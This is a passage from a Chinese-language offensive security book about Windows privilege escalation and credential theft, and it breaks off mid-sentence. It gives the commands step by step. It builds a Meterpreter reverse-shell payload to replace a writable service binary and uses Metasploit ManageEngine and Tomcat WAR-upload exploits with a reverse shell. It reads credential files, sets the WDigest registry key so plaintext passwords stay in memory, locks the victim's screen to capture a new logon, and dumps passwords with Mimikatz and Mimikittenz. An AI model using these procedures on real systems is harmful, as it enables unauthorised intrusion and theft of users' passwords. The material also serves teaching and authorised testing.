-   检查 AlwaysInstallElevated 注册表项，该注册表项指示.msi
    文件应以较高的权限 ( NT AUTHORITY\\SYSTEM ) 安装
-   [https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/always_install_elevated.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/always_install_elevated.rb){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
请注意，我们并不需要手动完成这些操作，因为别人已经创建了一些好的
metasploit 和 PowerShell 模块，特别是针对 Windows
的模块。在下面的示例中，我们将查看 [PowerUp PowerShell
脚本](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/PowerUp.ps1){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"}。在这种情况下，脚本与
Empire
一起在所有常见的错误配置区域运行查找，比如允许普通用户获得本地管理或系统帐户。在下面的示例中，我们在受害者系统上运行这个程序，发现它有一些本地系统的未引用服务路径。现在，我们可能无法重新启动服务，但我们应该能够利用这个漏洞，等待服务重启。
-   Empire PowerUp 模块:
    -   usermodule privesc/powerup/allchecks
![](4-13.png){.calibre11}
最突出的是:
-   ServiceName： WavesSysSvc
-   Path： C:\\Program Files\\Waves\\MaxxAudio\\WavesSysSvc64.exe
-   ModifiableFile： C:\\Program
    Files\\Waves\\MaxxAudio\\WavesSysSvc64.exe
-   ModifiableFilePermissions： {WriteOwner, Delete, WriteAttributes,
    Synchronize...}
-   **ModifiableFileIdentityReference： Everyone**
-   StartName： LocalSystem
看起来任何人都可以编写 WavesSysSyc 服务。这意味着我们可以将
WaveSysSvc64.exe 文件替换为我们自己的恶意二进制文件:
-   创建一个 Meterpreter 二进制文件（后续的文章将讨论如何绕过杀毒软件）
    -   msfvenom -p windows/meterpreter/reverse_https LHOST=\[ip\]
        LPORT=8080 -f exe \> shell.exe
-   使用 Empire 上传二进制文件并替换原始二进制文件
    -   upload ./shell.exe C:\\users\\test\\shell.exe
    -   shell copy C:\\users\\test\\Desktop\\shell.exe
        "C:\\ProgramFiles\\Waves\\MaxxAudio\\WavesSysSvc64.exe"
    -   重新启动服务或等待其重启
一旦服务重新启动，你你应该会收到一个升级为 `system`{.calibre14
.pcalibre4 .pcalibre3} 权限的 Meterpreter shell 。使用
`PowerUp`{.calibre14 .pcalibre4 .pcalibre3} powershell
脚本，你将发现许多不同的服务都会有权限提升的可能性。如果你想深入了解
Windows 权限提升的底层问题，请查看 FuzzSecurity
的文章：[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"} 。
对于未打补丁的 Windows 系统，我们确实有一些权限升级攻击，比如：（
[https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"} ）和 (
[https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135](https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"}
），但是我们如何快速识别目标系统上安装了哪些补丁呢，我们可以在受害者系统上使用系统默认自带的命令来查看安装了哪些系统补丁包。Windows
自带默认命令`systeminfo`{.calibre14 .pcalibre4 .pcalibre3}
将提取任何给定的 Windows
主机的所有补丁安装历史记录。我们可以拿回这个输出结果，将其复制到我们的
Kali 系统并运行 Windows Exploit Suggester
以查找已知的漏洞然后针对性的进行漏洞利用从而提升权限。
回到你攻击的 Windows 10系统：
-   systeminfo
-   systeminfo \> windows.txt
-   将 windows.txt 复制到你的 Kali 虚拟机的
    /opt/Windows-Exploit-Suggester 下
-   python ./windows-exploit-suggester.py -i ./windows.txt -d
    2018-03-21-mssb.xls
![](4-14.png){.calibre11}
这个工具已经有一段时间没有被维护了，但是你还是可以轻松地从中寻找到你正需要的能权限提升的漏洞。
如果我们处在一个已经打好所有补丁的 Windows
主机环境中，我们将重点关注第三方软件中的不同权限提升漏洞或操作系统的任何
0day 漏洞。例如，我们一直在寻找下面这样的漏洞
[http://bit.ly/2HnX5id](http://bit.ly/2HnX5id){.pcalibre2 .calibre9
.pcalibre .pcalibre1 target="_blank"} ，这是 Windows
中的权限升级漏洞，现在还没有修补。通常在这些场景中，可能会有一些基本的
POC
代码，但是我们需要测试、验证并多次复现这个漏洞。我们经常监控某些领域存在公共特权升级的漏洞：
-   [http://insecure.org/search.html?q=privilege%20escalation](http://insecure.org/search.html?q=privilege%20escalation){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   [https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=escalation&colspec=ID+Type+Status+Priority+Milestone+Owner+Summary&cells=ids](https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=escalation&colspec=ID+Type+Status+Priority+Milestone+Owner+Summary&cells=ids){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
通常，这只是时间问题。例如，当发现漏洞时，这可能是你在系统打好补丁之前进一步破坏系统有限的好机会。
### 权限提升实验 {#4_the_drive_compromising_the_network.html#权限提升实验 .calibre15}
测试并尝试不同类型的权限升级漏洞的最佳实验环境是 Rapid7的
[Metasploitable3](https://github.com/rapid7/metasploitable3){.pcalibre2
.calibre9 .pcalibre .pcalibre1
target="_blank"}。这个充满漏洞的框架会自动生成一个 Windows
虚拟机，其中包含所有常见的和不常见的漏洞。配置需要一点时间，但是一旦配置好了虚拟机，它就是一个非常棒的实验环境。
让我们来看一个简单的例子，然后快速开始：
-   使用 nmap 扫描 Metasploitable3 虚拟机的IP (
    确保全端口扫描免得你错过一些端口 )
-   你将看到 ManageEngine 在端口8383上运行
-   启动 Metasploit 并搜索任何 ManageEngine 有关的漏洞
    -   msfconsole
    -   search manageengine
    -   use exploit/windows/http/manageengine_connectionid_write
    -   set SSL True
    -   set RPORT 8383
    -   set RHOST \
    -   exploit
    -   getsystem
-   你会注意到你不能获得 `system`{.calibre14 .pcalibre4 .pcalibre3}
    权限，因为你所利用的服务未作为特权进程运行。这时，你能做到的就是尝试所有不同的权限提升攻击。
-   其中，我们看到的一件事是，Apache Tomcat
    是作为特权进程运行的。如果我们可以利用这个服务，我们就可以将我们的
    payload 作为更高层次的服务运行。我们看到 Apache Tomcat
    在外部网络的8282端口运行，但它需要用户名和密码。因为我们有一个本地低权限的
    shell，我们可以尝试在磁盘上搜索这个密码。我们可以在谷歌搜索"Tomcat密码存储在哪里"，搜索结果表明："tomcat-users.xml"。
-   在受害者机器中，我们可以搜索和读取 tomcat-users.xml 文件:
    -   shell
    -   cd \\ && dir /s tomcat-users.xml
    -   type "C:\\Program Files\\Apache Software
        Foundation\\tomcat\\apache-tomcat-8.0.33\\conf\\tomcat-users.xml
-   现在让我们使用找到的密码攻击 Tomcat。首先，登录到8282端口上的 Tomcat
    管理控制台，并查看我们的密码是否有效。然后，我们可以使用 Metasploit
    通过 Tomcat 部署恶意的 WAR 文件。
    -   search tomcat
    -   use exploit/multi/http/tomcat_mgr_upload
    -   show options
    -   set HTTPusername sploit
    -   set HTTPpassword sploit
    -   set RPORT 8282
    -   set RHOST \
    -   set Payload java/shell_reverse_tcp
    -   set LHOST \
    -   exploit
    -   whoami
-   你现在应该是 `system`{.calibre14 .pcalibre4 .pcalibre3}
    权限了。我们利用第三方的工具（tomcat）来提升权限到
    `system`{.calibre14 .pcalibre4 .pcalibre3} 权限。
### 从内存中提取明文凭据 {#4_the_drive_compromising_the_network.html#从内存中提取明文凭据 .calibre15}
[Mimikatz](https://github.com/gentilkiwi/mimikatz){.pcalibre2 .calibre9
.pcalibre .pcalibre1 target="_blank"}
自推出以来，就改变了在渗透入侵中获取明文密码的方式。在 Windows
10之前，以本地管理员的身份在主机系统上运行 Mimikatz 的话是允许攻击者从
lsass（本地安全机构子系统服务）中提取明文密码的。这种方法在 Windows 10
出现之前非常有效，而在 windows 10
中，即使你是本地管理员，也无法直接读取它。现在，我看到了一些奇怪的现象，其中单点登录（
SSO ）或者一些特殊的软件会把密码保存在 LSASS 进程中让 Mimikatz
读取，但是我们现在先忽略这个。在这一章中，我们将讨论当这件方法（指 SSO
和特殊的软件）不工作时该做什么（比如在 Windows 10系统中）。
假设你攻击了 Windows 10系统的主机并且提升权限了，默认情况下，你将调整
Mimikatz 的配置，并根据下面的查询查看到密码字段为空。
![](4-15.png){.calibre11}
那么你能做什么呢？最简单的选项是设置注册表项以让系统将密码凭证保存到
LSASS 进程。在 HKLM 中，有一个 UseLogonCredential
设置，如果设置为0，系统将在内存中存储凭据（
[http://bit.ly/2vhFBiZ](http://bit.ly/2vhFBiZ){.pcalibre2 .calibre9
.pcalibre .pcalibre1 target="_blank"} ）：
-   reg add
    HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest
    /v UseLogonCredential /t REG_DWORD /d 1 /f
-   在 Empire 中，我们可以通过 shell 命令运行：
    -   shell reg add
        HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest
        /v UseLogonCredential /t REG_DWORD /d 1 /f
这个注册表修改的问题就是需要用户重新登录到系统。你可以让目标机器屏幕锁屏、重新启动或注销用户，以便你能够捕获然后再次发送凭证文本。最简单的方法是锁定他们的工作机器（这样他们就不会丢失他们的当前的工作\...看看我有多好！）。要触发锁屏：
-   rundll32.exe user32.dll，LockWorkStation
一旦我们锁定屏幕，并让它们重新登录，我们就可以重新运行 Mimikatz
来获得明文密码。
![](4-16.png){.calibre11}
如果我们无法提升到本地管理帐户怎么办？我们还有哪些其他方法可以获得用户的凭证？在过去，一个常见的渗透攻击是在客户机的用户空间内存中查看凭据是否以明文形式存储。现在一切都是基于浏览器的，我们能在浏览器中做同样的事情吗？
在这里，putterpanda 将和一个很酷的 POC 工具在一起来完成这个任务，称为
[Mimikittenz](https://github.com/putterpanda/mimikittenz){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"}。Mimikittenz
所做的就是利用 Windows 函数
ReadProcessMemory()来提取来自各种目标进程（如浏览器）的密码，并输出纯文本。
Mimikitten 支持 Gmail，Office365，Outlook
Web，Jira，Github，Bugzilla，Zendesk，Cpanel，Dropbox，Microsoft
OneDrive，AWS Web 服务、Slack、Twitter 和 Facebook。编写 Mimimikittenz
搜索表达式也很容易。
这个工具最好的地方在于它不需要本地管理员权限，因为他只需要访问那些用户本身创建的进程。一旦我们攻击进了主机，我们将把